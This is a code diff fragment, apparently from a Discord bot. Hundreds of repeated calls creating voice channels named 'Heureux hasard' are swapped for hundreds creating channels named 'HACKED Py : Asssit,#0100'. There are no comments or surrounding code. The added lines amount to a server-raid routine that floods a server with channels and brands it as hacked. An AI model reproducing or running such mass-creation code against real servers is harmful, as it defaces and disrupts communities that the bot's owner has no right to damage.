-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice'); 
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
